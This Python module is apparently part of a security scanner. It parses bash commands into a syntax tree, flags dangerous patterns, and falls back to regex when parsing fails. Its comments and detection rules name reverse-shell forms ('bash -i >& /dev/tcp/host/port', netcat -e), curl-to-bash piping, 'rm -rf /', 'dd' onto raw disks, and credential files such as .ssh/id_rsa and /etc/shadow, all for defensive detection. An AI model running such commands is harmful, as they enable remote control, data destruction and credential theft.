"""
Trace-A5: AST-based bash command analysis using bashlex.

Replaces the regex-only BASH_PATTERNS approach in detectors.py with a
structural analysis of the parsed command tree.  Falls back to the original
regex patterns when bashlex cannot parse the command (e.g. heavily obfuscated
or invalid syntax), so detection coverage is never reduced.

Design principles:
  - Walk the AST to find structural patterns (pipe chains, eval, command
    substitution, redirect targets) rather than matching raw text.
  - Extract all command words and URLs from the tree for secondary checks.
  - Graceful degradation: parse errors → fall back to regex.
  - No side effects; pure functions only.
"""

from __future__ import annotations

import re
from typing import Any, NamedTuple

try:
    import bashlex  # type: ignore[import-untyped]

    _BASHLEX_AVAILABLE = True
except ImportError:  # pragma: no cover
    _BASHLEX_AVAILABLE = False

from skillscan_trace.models import Severity


# ---------------------------------------------------------------------------
# AST node visitor helpers
# ---------------------------------------------------------------------------


def _collect_nodes(node: Any, kind: str) -> list[Any]:
    """Recursively collect all AST nodes of the given kind."""
    results: list[Any] = []
    if node.kind == kind:
        results.append(node)
    for child in getattr(node, "parts", []):
        results.extend(_collect_nodes(child, kind))
    return results


def _collect_command_words(node: Any) -> list[str]:
    """Return all word values from command nodes in the tree."""
    words: list[str] = []
    if node.kind == "command":
        for part in getattr(node, "parts", []):
            if part.kind == "word":
                words.append(getattr(part, "word", ""))
    for child in getattr(node, "parts", []):
        words.extend(_collect_command_words(child))
    return words


def _collect_all_words(node: Any) -> list[str]:
    """Return every word value in the entire AST."""
    words: list[str] = []
    if node.kind == "word":
        w = getattr(node, "word", "")
        if w:
            words.append(w)
    for child in getattr(node, "parts", []):
        words.extend(_collect_all_words(child))
    return words


def _pipeline_commands(node: Any) -> list[list[str]]:
    """
    Return a list of command-word-lists for each command in a pipeline.
    E.g. 'base64 -d x | bash' → [['base64', '-d', 'x'], ['bash']]
    """
    if node.kind != "pipeline":
        return []
    cmds: list[list[str]] = []
    for child in getattr(node, "parts", []):
        if child.kind == "command":
            words = [p.word for p in getattr(child, "parts", []) if p.kind == "word"]
            cmds.append(words)
    return cmds


# ---------------------------------------------------------------------------
# AST-based detection rules
# ---------------------------------------------------------------------------

_SHELL_INTERPRETERS = {"bash", "sh", "zsh", "dash", "ksh", "fish", "ash", "busybox"}
# Broader set for pipe-detection: interpreters that will execute piped stdin
# as code, making them dangerous pipe targets even though they aren't POSIX
# shells in the strict sense.
_PIPE_TARGET_INTERPRETERS = _SHELL_INTERPRETERS | {
    "python",
    "python2",
    "python3",
    "perl",
    "ruby",
    "php",
    "node",
    "deno",
    "lua",
    "tclsh",
}
# Also recognise absolute-path / variable-indirected shell invocations.
_SHELL_PATH_PREFIXES = ("/bin/", "/usr/bin/", "/usr/local/bin/", "/sbin/", "/usr/sbin/")
_SHELL_INDIRECTION_TOKENS = {"${SHELL}", "$SHELL", "$0", "$BASH"}
_ENCODE_TOOLS = {"base64", "openssl", "xxd", "od", "python", "python3", "perl", "ruby"}
_FETCH_TOOLS = {"curl", "wget", "fetch", "aria2c", "axel", "httpie", "http"}
_REVERSE_SHELL_FLAGS = {"-e", "--exec", "--sh-exec"}
# nc/ncat -c is also a reverse-shell flag but collides with the bash/sh -c
# inline-command flag, so it's checked only in the netcat context.
_PRIVESC_TOOLS = {"sudo", "doas", "pkexec", "gosu"}
_DESTRUCTIVE_TARGETS = {
    "/",
    "/*",
    "/bin",
    "/boot",
    "/dev",
    "/etc",
    "/home",
    "/lib",
    "/lib64",
    "/opt",
    "/root",
    "/sbin",
    "/srv",
    "/sys",
    "/usr",
    "/var",
    "~",
    "$HOME",
    "${HOME}",
    ".",
    "./",
    "*",
}
_MKFS_TOOLS = {
    "mkfs",
    "mkfs.ext2",
    "mkfs.ext3",
    "mkfs.ext4",
    "mkfs.xfs",
    "mkfs.vfat",
    "mkfs.btrfs",
    "mkfs.ntfs",
    "dd",  # dd if=/dev/zero of=/dev/sda is destructive
}


def _is_shell_word(word: str, interpreter_set: set[str] | None = None) -> bool:
    """Return True if `word` names a shell / scripting interpreter.

    If `interpreter_set` is None, only strict shell names match.  Pass
    `_PIPE_TARGET_INTERPRETERS` to also match python/perl/ruby/node/etc.,
    which is the set used for pipe-target detection.
    """
    if not word:
        return False
    w = word.strip()
    lower = w.lower()
    targets = interpreter_set if interpreter_set is not None else _SHELL_INTERPRETERS
    # Variable indirection — treat as shell (conservative)
    if w in _SHELL_INDIRECTION_TOKENS:
        return True
    # Direct interpreter name
    if lower in targets:
        return True
    # Absolute path ending in an interpreter name
    for prefix in _SHELL_PATH_PREFIXES:
        if lower.startswith(prefix):
            tail = lower[len(prefix) :]
            if tail in targets:
                return True
    return False


def _check_pipeline(pipeline_node: Any) -> list[tuple[str, Severity, str]]:
    """
    Detect dangerous pipeline patterns:
      - encode_tool | shell  (base64 -d | bash)
      - fetch_tool | shell   (curl url | bash)
      - echo | shell         (echo payload | sh)
    Returns list of (rule_id, severity, message).
    """
    hits: list[tuple[str, Severity, str]] = []
    cmds = _pipeline_commands(pipeline_node)
    if len(cmds) < 2:
        return hits

    # Walk consecutive pairs in the pipeline
    for i in range(len(cmds) - 1):
        left_raw = cmds[i][0] if cmds[i] else ""
        right_raw = cmds[i + 1][0] if cmds[i + 1] else ""
        left_cmd = left_raw.lower()
        right_cmd = right_raw.lower()

        right_is_shell = _is_shell_word(right_raw, _PIPE_TARGET_INTERPRETERS)

        if right_is_shell:
            # Generic "pipe into a shell" finding (BASH-PIPE-SHELL).  This
            # always fires whenever ANY command pipes into a shell
            # interpreter, covering unusual left-hand sides that the specific
            # rules below miss.
            hits.append(
                (
                    "BASH-PIPE-SHELL",
                    Severity.CRITICAL,
                    f"Pipeline into shell interpreter: {left_raw or '?'} piped to {right_raw}",
                )
            )

            if left_cmd in _ENCODE_TOOLS or left_cmd == "base64":
                hits.append(
                    (
                        "CMD-TRACE-003",
                        Severity.CRITICAL,
                        f"Encoded payload execution: {left_cmd} piped to {right_cmd}",
                    )
                )
            elif left_cmd in _FETCH_TOOLS:
                hits.append(
                    (
                        "CMD-TRACE-003",
                        Severity.CRITICAL,
                        f"Remote payload execution: {left_cmd} piped to {right_cmd}",
                    )
                )
            elif left_cmd == "echo":
                hits.append(
                    (
                        "CMD-TRACE-003",
                        Severity.HIGH,
                        f"Encoded payload execution: echo piped to {right_cmd}",
                    )
                )
            elif left_cmd == "cat":
                hits.append(
                    (
                        "CMD-TRACE-003",
                        Severity.HIGH,
                        f"File content piped to {right_cmd}",
                    )
                )

    return hits


def _check_eval(command_node: Any) -> list[tuple[str, Severity, str]]:
    """Detect eval with command substitution: eval $(...)"""
    hits: list[tuple[str, Severity, str]] = []
    parts = getattr(command_node, "parts", [])
    if not parts:
        return hits
    first_word = getattr(parts[0], "word", "").lower() if parts[0].kind == "word" else ""
    if first_word != "eval":
        return hits

    # Look for commandsubstitution nodes in the eval arguments
    for part in parts[1:]:
        if part.kind == "word":
            subs = _collect_nodes(part, "commandsubstitution")
            if subs:
                hits.append(
                    (
                        "CMD-TRACE-001",
                        Severity.CRITICAL,
                        "Suspicious bash: eval with command substitution $(...)",
                    )
                )
                break
        elif part.kind == "commandsubstitution":
            hits.append(
                (
                    "CMD-TRACE-001",
                    Severity.CRITICAL,
                    "Suspicious bash: eval with command substitution $(...)",
                )
            )
            break

    return hits


def _check_fetch_commands(command_node: Any) -> list[tuple[str, Severity, str, str]]:
    """
    Detect curl/wget calls and extract the URL.
    Returns (rule_id, severity, message, url).
    """
    hits: list[tuple[str, Severity, str, str]] = []
    parts = getattr(command_node, "parts", [])
    if not parts:
        return hits
    cmd = getattr(parts[0], "word", "").lower() if parts[0].kind == "word" else ""
    if cmd not in _FETCH_TOOLS:
        return hits

    # Extract URL arguments (words starting with http/https/ftp)
    for part in parts[1:]:
        if part.kind == "word":
            w = getattr(part, "word", "")
            if re.match(r"https?://|ftp://", w, re.I):
                hits.append(
                    (
                        "EXF-TRACE-001",
                        Severity.HIGH,
                        f"Outbound HTTP request via bash ({cmd})",
                        w,
                    )
                )

    return hits


def _check_netcat(command_node: Any) -> list[tuple[str, Severity, str]]:
    """Detect netcat reverse/bind shell patterns."""
    hits: list[tuple[str, Severity, str]] = []
    parts = getattr(command_node, "parts", [])
    if not parts:
        return hits
    cmd = getattr(parts[0], "word", "").lower() if parts[0].kind == "word" else ""
    if cmd not in {"nc", "ncat", "netcat", "nc.traditional"}:
        return hits

    flags = {getattr(p, "word", "") for p in parts if p.kind == "word"}
    # For netcat specifically, `-c` is also a reverse-shell flag (not the
    # standard inline-command flag).
    nc_reverse_flags = _REVERSE_SHELL_FLAGS | {"-e", "-c"}
    if flags & nc_reverse_flags:
        hits.append(
            (
                "EXF-TRACE-001",
                Severity.CRITICAL,
                f"Reverse shell or bind shell via {cmd} with -e/-c flag",
            )
        )
    return hits


def _check_persistence(command_node: Any) -> list[tuple[str, Severity, str]]:
    """Detect crontab manipulation and shell startup file writes."""
    hits: list[tuple[str, Severity, str]] = []
    parts = getattr(command_node, "parts", [])
    if not parts:
        return hits
    cmd = getattr(parts[0], "word", "").lower() if parts[0].kind == "word" else ""

    if cmd == "crontab":
        hits.append(
            (
                "CMD-TRACE-002",
                Severity.HIGH,
                "crontab invocation — potential persistence mechanism",
            )
        )
        return hits

    # Check redirect targets for shell startup files
    redirects = _collect_nodes(command_node, "redirect")
    for r in redirects:
        for part in getattr(r, "parts", []):
            if part.kind == "word":
                w = getattr(part, "word", "")
                if re.search(r"(\.bashrc|\.bash_profile|\.profile|\.zshrc|/etc/cron)", w, re.I):
                    hits.append(
                        (
                            "CMD-TRACE-002",
                            Severity.MEDIUM,
                            f"Write to shell startup/cron file: {w}",
                        )
                    )

    return hits


def _check_sensitive_reads(command_node: Any) -> list[tuple[str, Severity, str, str]]:
    """
    Detect reads of sensitive files via cat/head/tail/less/more.
    Returns (rule_id, severity, message, path).
    """
    hits: list[tuple[str, Severity, str, str]] = []
    parts = getattr(command_node, "parts", [])
    if not parts:
        return hits
    cmd = getattr(parts[0], "word", "").lower() if parts[0].kind == "word" else ""
    if cmd not in {"cat", "head", "tail", "less", "more", "tee", "grep"}:
        return hits

    _SENSITIVE = re.compile(
        r"(\.ssh/(id_rsa|id_ed25519|authorized_keys)|\.aws/(credentials|config)"
        r"|\.env\b|\.npmrc|\.netrc|/etc/(passwd|shadow|sudoers)"
        r"|(api[_-]?key|secret|token|password))",
        re.I,
    )
    for part in parts[1:]:
        if part.kind == "word":
            w = getattr(part, "word", "")
            if _SENSITIVE.search(w):
                hits.append(
                    (
                        "EXF-TRACE-003",
                        Severity.INFO,
                        f"Sensitive file access via {cmd}: {w}",
                        w,
                    )
                )

    return hits


def _check_destructive(command_node: Any) -> list[tuple[str, Severity, str]]:
    """Detect destructive filesystem commands: `rm -rf /`, `mkfs`, `dd of=/dev/sdX`."""
    hits: list[tuple[str, Severity, str]] = []
    parts = getattr(command_node, "parts", [])
    if not parts:
        return hits
    cmd = getattr(parts[0], "word", "").lower() if parts[0].kind == "word" else ""

    word_values = [getattr(p, "word", "") for p in parts if p.kind == "word"]

    if cmd == "rm":
        has_recursive = any(
            re.match(r"^-[A-Za-z]*[rR][A-Za-z]*$", w) or w in ("--recursive", "-r", "-R", "-rf")
            for w in word_values[1:]
        )
        has_force = any(
            re.match(r"^-[A-Za-z]*[fF][A-Za-z]*$", w) or w == "--force" for w in word_values[1:]
        )
        for w in word_values[1:]:
            if w.startswith("-"):
                continue
            if w in _DESTRUCTIVE_TARGETS or w.startswith("/*"):
                sev = Severity.CRITICAL if (has_recursive or has_force) else Severity.HIGH
                hits.append(
                    (
                        "BASH-DESTRUCTIVE",
                        sev,
                        f"Destructive filesystem operation: rm {'-rf ' if has_recursive else ''}{w}",
                    )
                )
                break

    # mkfs.* formats a disk — always destructive
    if cmd in _MKFS_TOOLS and cmd.startswith("mkfs"):
        hits.append(
            (
                "BASH-DESTRUCTIVE",
                Severity.CRITICAL,
                f"Filesystem format command: {cmd}",
            )
        )

    # dd if=... of=/dev/sdX is destructive; dd alone is not
    if cmd == "dd":
        for w in word_values[1:]:
            if w.startswith("of=/dev/") and not w.startswith("of=/dev/null"):
                hits.append(
                    (
                        "BASH-DESTRUCTIVE",
                        Severity.CRITICAL,
                        f"Raw-device write via dd: {w}",
                    )
                )
                break

    # shred, wipe
    if cmd in {"shred", "wipe"}:
        hits.append(
            (
                "BASH-DESTRUCTIVE",
                Severity.HIGH,
                f"Secure-deletion command: {cmd}",
            )
        )

    return hits


def _check_privesc(command_node: Any) -> list[tuple[str, Severity, str]]:
    """Detect privilege-escalation tool invocations: sudo, doas, pkexec."""
    hits: list[tuple[str, Severity, str]] = []
    parts = getattr(command_node, "parts", [])
    if not parts:
        return hits
    cmd = getattr(parts[0], "word", "").lower() if parts[0].kind == "word" else ""
    if cmd in _PRIVESC_TOOLS:
        hits.append(
            (
                "BASH-PRIVESC",
                Severity.HIGH,
                f"Privilege-escalation command: {cmd}",
            )
        )
    return hits


def _check_reverse_shell(command_node: Any) -> list[tuple[str, Severity, str]]:
    """
    Detect reverse-shell patterns that rely on redirection rather than nc:
      bash -i >& /dev/tcp/host/port
      sh -i < /dev/tcp/host/port
      python -c "import pty; pty.spawn(...)"
      python -c "import socket,os,pty,subprocess;..."
    """
    hits: list[tuple[str, Severity, str]] = []
    parts = getattr(command_node, "parts", [])
    if not parts:
        return hits

    first = getattr(parts[0], "word", "") if parts[0].kind == "word" else ""
    first_lower = first.lower()

    # Pattern: shell + /dev/tcp|udp/ redirect target
    if _is_shell_word(first):
        redirects = _collect_nodes(command_node, "redirect")
        for r in redirects:
            target_word = ""
            # bashlex attaches the target as `output` or `input` attribute
            out = getattr(r, "output", None)
            if out is not None and getattr(out, "kind", "") == "word":
                target_word = getattr(out, "word", "")
            if not target_word:
                for rp in getattr(r, "parts", []):
                    if rp.kind == "word":
                        target_word = getattr(rp, "word", "")
                        break
            if re.search(r"/dev/(tcp|udp)/", target_word, re.I):
                hits.append(
                    (
                        "BASH-REVERSE-SHELL",
                        Severity.CRITICAL,
                        f"Reverse shell via {first} and {target_word}",
                    )
                )

    # Pattern: python -c "...socket... OR ...pty.spawn..."
    if first_lower in {"python", "python2", "python3", "perl", "ruby", "php"}:
        # Collect remaining words
        args = [getattr(p, "word", "") for p in parts[1:] if p.kind == "word"]
        # -c must be present
        if "-c" in args or "-e" in args:
            joined = " ".join(args)
            if re.search(
                r"(pty\.spawn|import\s+socket|socket\.socket|subprocess\.call|os\.dup2|"
                r"fsockopen|/dev/tcp/|use\s+socket|PF_INET|SOCK_STREAM|sockaddr_in)",
                joined,
                re.I,
            ):
                hits.append(
                    (
                        "BASH-REVERSE-SHELL",
                        Severity.CRITICAL,
                        f"Reverse shell via {first_lower} -c <code>",
                    )
                )

    return hits


def _check_redirection_to_shell(command_node: Any) -> list[tuple[str, Severity, str]]:
    """Detect `sh < some_file` and similar input-redirection into a shell."""
    hits: list[tuple[str, Severity, str]] = []
    parts = getattr(command_node, "parts", [])
    if not parts:
        return hits
    first = getattr(parts[0], "word", "") if parts[0].kind == "word" else ""
    if not _is_shell_word(first):
        return hits

    redirects = _collect_nodes(command_node, "redirect")
    for r in redirects:
        rtype = getattr(r, "type", "")
        if rtype == "<":
            target_word = ""
            out = getattr(r, "output", None)
            if out is not None and getattr(out, "kind", "") == "word":
                target_word = getattr(out, "word", "")
            if not target_word:
                for rp in getattr(r, "parts", []):
                    if rp.kind == "word":
                        target_word = getattr(rp, "word", "")
                        break
            # Skip the already-flagged /dev/tcp reverse-shell case
            if target_word and not re.search(r"/dev/(tcp|udp)/", target_word, re.I):
                hits.append(
                    (
                        "BASH-PIPE-SHELL",
                        Severity.HIGH,
                        f"Input redirected into shell: {first} < {target_word}",
                    )
                )
    return hits


def _check_cred_theft(command_node: Any) -> list[tuple[str, Severity, str]]:
    """Detect common credential-theft reads that `_check_sensitive_reads`
    already covers, but re-tag with the BASH-CRED-THEFT rule ID for
    high-severity sensitive paths (/etc/shadow, ~/.ssh/id_rsa, AWS creds).
    """
    hits: list[tuple[str, Severity, str]] = []
    parts = getattr(command_node, "parts", [])
    if not parts:
        return hits
    cmd = getattr(parts[0], "word", "").lower() if parts[0].kind == "word" else ""
    if cmd not in {"cat", "head", "tail", "less", "more", "tee", "grep", "cp", "mv"}:
        return hits

    high_severity = re.compile(
        r"(/etc/shadow|/etc/sudoers|\.ssh/(id_rsa|id_ed25519|id_dsa|id_ecdsa)"
        r"|\.aws/credentials|\.docker/config\.json|\.kube/config|\.netrc|\.pypirc"
        r"|\.gnupg/|\.git-credentials)",
        re.I,
    )
    for part in parts[1:]:
        if part.kind == "word":
            w = getattr(part, "word", "")
            if high_severity.search(w):
                hits.append(
                    (
                        "BASH-CRED-THEFT",
                        Severity.HIGH,
                        f"Credential-bearing file read via {cmd}: {w}",
                    )
                )
    return hits


def _check_shell_dash_c(command_node: Any, raw_command: str) -> list["BashFinding"]:
    """
    Recursively re-analyze the argument to `bash -c "..."` / `sh -c "..."` /
    `${SHELL} -c "..."` so patterns inside the quoted string are still caught.
    Returns a list of already-constructed BashFindings.
    """
    results: list[BashFinding] = []
    parts = getattr(command_node, "parts", [])
    if len(parts) < 3:
        return results

    first = getattr(parts[0], "word", "") if parts[0].kind == "word" else ""
    if not _is_shell_word(first):
        return results

    # Find a `-c` flag word followed by a word argument
    words_with_idx = [(i, getattr(p, "word", "")) for i, p in enumerate(parts) if p.kind == "word"]
    for idx_pos, (i, w) in enumerate(words_with_idx):
        if w == "-c" and idx_pos + 1 < len(words_with_idx):
            inline = words_with_idx[idx_pos + 1][1]
            if not inline:
                continue
            # Recurse: analyze the inline string.  Use a separate try so
            # nested parse errors don't kill the outer analysis.
            try:
                nested = analyze_bash_ast(inline)
                for bf in nested:
                    results.append(
                        BashFinding(
                            rule_id=bf.rule_id,
                            severity=bf.severity,
                            message=bf.message + " (inside -c argument)",
                            evidence=bf.evidence or raw_command[:300],
                        )
                    )
            except BashParseError:
                pass
            break
    return results


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


class BashFinding(NamedTuple):
    rule_id: str
    severity: Severity
    message: str
    evidence: str


def analyze_bash_ast(command: str) -> list[BashFinding]:
    """
    Parse `command` with bashlex and return a list of BashFindings.

    Returns an empty list if the command is empty or contains no suspicious
    patterns.  Raises BashParseError if bashlex cannot parse the command so
    the caller can fall back to regex.
    """
    if not command or not command.strip():
        return []

    if not _BASHLEX_AVAILABLE:
        raise BashParseError("bashlex not installed")

    try:
        parts = bashlex.parse(command)
    except Exception as e:
        raise BashParseError(str(e)) from e

    findings: list[BashFinding] = []

    for node in parts:
        findings.extend(_walk_node(node, command))

    return findings


def _walk_node(node: Any, raw_command: str) -> list[BashFinding]:
    """Recursively walk an AST node and collect findings."""
    results: list[BashFinding] = []

    if node.kind == "pipeline":
        for rule_id, severity, message in _check_pipeline(node):
            results.append(BashFinding(rule_id, severity, message, raw_command[:300]))

    if node.kind == "command":
        for rule_id, severity, message in _check_eval(node):
            results.append(BashFinding(rule_id, severity, message, raw_command[:300]))

        for rule_id, severity, message, url in _check_fetch_commands(node):
            results.append(BashFinding(rule_id, severity, message, url))

        for rule_id, severity, message in _check_netcat(node):
            results.append(BashFinding(rule_id, severity, message, raw_command[:300]))

        for rule_id, severity, message in _check_persistence(node):
            results.append(BashFinding(rule_id, severity, message, raw_command[:300]))

        for rule_id, severity, message, path in _check_sensitive_reads(node):
            results.append(BashFinding(rule_id, severity, message, path))

        for rule_id, severity, message in _check_destructive(node):
            results.append(BashFinding(rule_id, severity, message, raw_command[:300]))

        for rule_id, severity, message in _check_privesc(node):
            results.append(BashFinding(rule_id, severity, message, raw_command[:300]))

        for rule_id, severity, message in _check_reverse_shell(node):
            results.append(BashFinding(rule_id, severity, message, raw_command[:300]))

        for rule_id, severity, message in _check_redirection_to_shell(node):
            results.append(BashFinding(rule_id, severity, message, raw_command[:300]))

        for rule_id, severity, message in _check_cred_theft(node):
            results.append(BashFinding(rule_id, severity, message, raw_command[:300]))

        # Recurse into bash -c "..." style inline commands
        results.extend(_check_shell_dash_c(node, raw_command))

    # Recurse into children
    for child in getattr(node, "parts", []):
        results.extend(_walk_node(child, raw_command))

    return results


class BashParseError(Exception):
    """Raised when bashlex cannot parse the command string."""

    pass


# Regex patterns used ONLY when bashlex fails to parse.  Kept small and
# high-signal — the AST path is the primary detection layer.
_FALLBACK_REGEX_PATTERNS: list[tuple[re.Pattern[str], str, Severity, str]] = [
    (
        re.compile(r"\bbase64\b.*\|.*\b(bash|sh|exec|eval)\b", re.I | re.S),
        "CMD-TRACE-003",
        Severity.CRITICAL,
        "Encoded payload execution: base64 decode piped to shell",
    ),
    (
        re.compile(r"\b(curl|wget)\b[^|]*\|[^|]*\b(bash|sh|zsh|python)\b", re.I | re.S),
        "BASH-PIPE-SHELL",
        Severity.CRITICAL,
        "Remote payload execution via curl/wget piped to shell",
    ),
    (
        re.compile(r"\beval\b.*\$\(", re.I),
        "CMD-TRACE-001",
        Severity.CRITICAL,
        "Suspicious bash: eval with command substitution",
    ),
    (
        re.compile(r"\b(nc|ncat|netcat)\b.*-[el]", re.I),
        "EXF-TRACE-001",
        Severity.CRITICAL,
        "Reverse shell or bind shell via netcat",
    ),
    (
        re.compile(r"/dev/(tcp|udp)/", re.I),
        "BASH-REVERSE-SHELL",
        Severity.CRITICAL,
        "Reverse shell via /dev/tcp or /dev/udp redirect",
    ),
    (
        re.compile(r"\brm\s+[^\n]*-[rRfF]+[^\n]*(\s+/\s*$|\s+/\s|\s+\*|\s+\$HOME|\s+~)", re.I),
        "BASH-DESTRUCTIVE",
        Severity.CRITICAL,
        "Destructive rm -rf against root / home / wildcard",
    ),
    (
        re.compile(r"\bmkfs(\.\w+)?\b", re.I),
        "BASH-DESTRUCTIVE",
        Severity.CRITICAL,
        "Filesystem format command (mkfs)",
    ),
    (
        re.compile(r"\b(sudo|doas|pkexec|gosu)\b", re.I),
        "BASH-PRIVESC",
        Severity.HIGH,
        "Privilege-escalation command",
    ),
    (
        re.compile(
            r"(\.ssh/(id_rsa|id_ed25519|id_dsa)|/etc/shadow|\.aws/credentials|\.netrc)",
            re.I,
        ),
        "BASH-CRED-THEFT",
        Severity.HIGH,
        "Reference to credential-bearing file",
    ),
]


def analyze_bash_with_fallback(command: str) -> list[BashFinding]:
    """
    Convenience entry point: run the AST analyzer, and if bashlex fails to
    parse, emit a BASH-PARSE-ERROR finding plus a reduced regex-based scan.

    This is the function callers should prefer when they want a single list
    of findings without having to handle BashParseError themselves.
    """
    if not command or not command.strip():
        return []

    try:
        return analyze_bash_ast(command)
    except BashParseError as e:
        findings: list[BashFinding] = [
            BashFinding(
                rule_id="BASH-PARSE-ERROR",
                severity=Severity.MEDIUM,
                message=(
                    "Bash command failed to parse — may be intentionally obfuscated"
                    f" (parser error: {str(e)[:80]})"
                ),
                evidence=command[:300],
            )
        ]
        for pattern, rule_id, severity, message in _FALLBACK_REGEX_PATTERNS:
            if pattern.search(command):
                findings.append(
                    BashFinding(
                        rule_id=rule_id,
                        severity=severity,
                        message=message + " [regex-fallback]",
                        evidence=command[:300],
                    )
                )
        return findings
